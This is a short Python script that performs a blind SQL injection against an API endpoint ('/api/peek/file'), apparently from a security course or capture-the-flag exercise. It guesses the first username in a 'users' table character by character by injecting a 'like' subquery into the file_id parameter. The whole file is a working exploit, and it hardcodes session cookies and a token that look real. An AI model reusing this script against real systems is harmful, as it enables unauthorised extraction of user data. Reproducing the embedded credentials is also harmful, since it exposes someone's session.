#!/usr/bin/python

import requests
import sys

list = ['{','}','-',',','.','\_','+',' ','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']

query = "1 and (select username from users limit 0,1) like '{}%%'"
cookie = {
    'zid': 'z5136212',
    'token': 'b529463a4ae62564259f45b77952a08b73b8d4e65b1d42ebdaf3b784e12ce518',
    'session': 'eyJyb2xlIjoiU3RhZmYiLCJ1c2VybmFtZSI6ImNsb25nIn0.D3EhQA.ts3yWAj_V_rETT5pOI3wBngXxxU'
}

exist = ''
found = False

while 1:
    found = False
    for i in range(len(list)):
        r = requests.get("http://drive.bing.ns.agency/api/peek/file", params={'file_id': query.format(exist + list[i])}, cookies=cookie)
        # print(r.text)
        if "admin" in r.text:
            exist += list[i]
            print exist
            found = True
            break
    if not found:
        print 'Finished'
        sys.exit(0)
